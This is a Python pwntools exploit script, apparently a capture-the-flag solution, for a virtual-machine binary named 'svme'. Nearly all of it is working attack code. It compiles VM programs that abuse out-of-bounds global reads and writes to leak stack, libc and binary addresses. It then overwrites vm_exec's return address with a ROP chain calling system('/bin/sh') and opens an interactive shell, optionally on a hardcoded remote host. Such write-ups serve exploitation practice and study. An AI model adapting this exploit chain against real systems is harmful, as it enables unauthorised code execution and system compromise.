#!/usr/bin/env python3

from pwn import *

the_binary = "./svme"
# the_binary = "./svme.dbg"
context.binary = the_binary
elf = context.binary
libc = ELF("./libc-2.31.so", checksec=False)

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("47.243.140.252", 1337)
elif args.STRACE:
    io = process(["strace", "-o" ,"strace.txt", the_binary])
elif args.LTRACE:
    io = process(["ltrace", "-o", "ltrace.txt", the_binary])
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}

        # Opcode jump table statement in vm_exec.
        # pie break *0x13a5

        # Return from vm_exec.
        pie break *0x19c0

        continue
    """)

class Opcodes:
    noop    = 0
    iadd    = 1   # int add
    isub    = 2
    imul    = 3
    ilt     = 4   # int less than
    ieq     = 5   # int equal
    br      = 6   # branch
    brt     = 7   # branch if true
    brf     = 8   # branch if true
    iconst  = 9   # push constant integer
    load    = 10  # load from local context
    gload   = 11  # load from global memory
    store   = 12  # store in local context
    gstore  = 13  # store in global memory
    print_  = 14  # print stack top
    pop     = 15  # throw away top of stack
    call    = 16  # call function at address with nargs,nlocals
    ret     = 17  # return value from function
    halt    = 18

class Const:
    max_program_size = 128

class Offsets:
    vm_first_stack_frame_locals_to_vm_globals = 0x116c // 4

    vm_globals_to_its_own_ptr = -0x20f0 // 4
    vm_globals_to_stack_ptr = -0x2100 // 4

    vm_first_stack_frame_to_overwrite_vm_globals_ptr = -0xf84 // 4

    stack_ptr_on_heap_to_main_ptr = 0x238 // 4
    stack_ptr_to_vm_exec_return_ptr = -0x28 // 4
    stack_ptr_to_stored_libc_start_main_ptr = 0x218 // 4

def signed_int32(i):
    return u32(p32(i), signed=True)

def split_qword(qword):
    upper_dword = (qword >> 0x20) & 0xffffffff
    upper_dword = signed_int32(upper_dword)

    lower_dword = qword & 0xffffffff
    lower_dword = signed_int32(lower_dword)

    return upper_dword, lower_dword

def set_vm_globals_ptr_from_stack():
    """Set the vm->globals pointer from the top two dwords on the vm stack."""
    return [
        Opcodes.store, Offsets.vm_first_stack_frame_to_overwrite_vm_globals_ptr+1,
        Opcodes.store, Offsets.vm_first_stack_frame_to_overwrite_vm_globals_ptr,
    ]

def gstore_qword(offset):
    return [
        Opcodes.gstore, offset+1,
        Opcodes.gstore, offset,
    ]

def gload_qword(offset):
    return [
        Opcodes.gload, offset,
        Opcodes.gload, offset+1,
    ]

def set_vm_globals_ptr_imm(qword):
    """Set the vm->globals pointer to an immediate qword."""
    upper_dword, lower_dword = split_qword(qword)
    return [
        Opcodes.iconst, upper_dword,
        Opcodes.store, Offsets.vm_first_stack_frame_to_overwrite_vm_globals_ptr+1,
        Opcodes.iconst, lower_dword,
        Opcodes.store, Offsets.vm_first_stack_frame_to_overwrite_vm_globals_ptr,
    ]

def compile_program(program_opcodes):
    assert len(program_opcodes) <= Const.max_program_size
    for i in range(Const.max_program_size - len(program_opcodes)):
        program_opcodes.append(Opcodes.noop)

    return b"".join(p32(i, signed=True) for i in program_opcodes)

def parse_next_leaked_qword():
    io.recvuntil(":  print")
    upper_dword = int(io.recvuntil("\n", drop=True))
    upper_dword = u32(p32(upper_dword, signed=True))

    io.recvuntil(":  print")
    lower_dword = int(io.recvuntil("\n", drop=True))
    lower_dword = u32(p32(lower_dword, signed=True))

    return (upper_dword << 0x20) | lower_dword

leaker_program = [
    # Load a stack address from the heap onto the top of the vm stack and print it.
    *gload_qword(Offsets.vm_globals_to_stack_ptr),
    Opcodes.print_,
    Opcodes.print_,

    # Load the stack address onto the top of the vm stack again.
    *gload_qword(Offsets.vm_globals_to_stack_ptr),

    # Overwrite the vm->globals pointer with the stack address.
    *set_vm_globals_ptr_from_stack(),

    # Load the stored __libc_start_main address onto the vm stack and print it.
    *gload_qword(Offsets.stack_ptr_to_stored_libc_start_main_ptr),
    Opcodes.print_,
    Opcodes.print_,

    # Load the address of main onto the vm stack and print it.
    *gload_qword(Offsets.stack_ptr_on_heap_to_main_ptr),
    Opcodes.print_,
    Opcodes.print_,

    # Load the address of main onto the vm stack again.
    *gload_qword(Offsets.stack_ptr_on_heap_to_main_ptr),

    # Store the address of main over the real program's vm_exec stored return address.
    *gstore_qword(Offsets.stack_ptr_to_vm_exec_return_ptr),

    # Trigger return from vm_exec.
    Opcodes.halt,
]
io.send(compile_program(leaker_program))

stack_leak = parse_next_leaked_qword()
log.info("Stack leak: %#x" % stack_leak)

libc_leak = parse_next_leaked_qword()
log.info("libc leak: %#x" % libc_leak)
libc.address = libc_leak - 0x270b3
log.info("libc base: %#x" % libc.address)
libc_bin_sh = next(libc.search(b"/bin/sh\x00"))
log.info("Using libc /bin/sh string at %#x" % libc_bin_sh)

elf_leak = parse_next_leaked_qword()
log.info("ELF leak: %#x" % elf_leak)
elf.address = elf_leak - 0x1c7b
log.info("ELF base: %#x" % elf.address)

# We send another program that overwrites the vm_exec stack with a ROP chain.
rop_chain = [
    libc.address + 0x0000000000026b72,  # pop rdi; ret
    libc_bin_sh,
    libc.sym.system,
]

exec_program = set_vm_globals_ptr_imm(stack_leak - 0x260)
rop_offset = 0
for rop_qword in rop_chain:
    rop_upper_dword, rop_lower_dword = split_qword(rop_qword)

    exec_program.extend([
        Opcodes.iconst, rop_lower_dword,
        Opcodes.iconst, rop_upper_dword,
    ])
    exec_program.extend(gstore_qword(rop_offset))
    rop_offset += 2
exec_program.append(Opcodes.halt)

io.send(compile_program(exec_program))
io.interactive()
